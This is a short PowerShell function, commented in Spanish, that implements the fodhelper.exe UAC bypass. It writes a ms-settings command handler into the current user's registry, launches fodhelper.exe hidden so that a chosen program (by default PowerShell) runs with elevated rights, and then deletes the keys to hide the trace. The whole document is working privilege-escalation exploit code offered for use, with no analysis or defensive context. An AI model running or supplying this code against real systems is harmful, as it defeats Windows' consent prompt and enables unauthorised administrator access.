function FodhelperBypass { 
    Param (
        [String]$programa = "cmd /c start powershell.exe" # por defecto
    )

    # Crear la estructura del registro
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $programa -Force

    # Realizar el bypass
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    # Eliminar la estructura del registro
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}
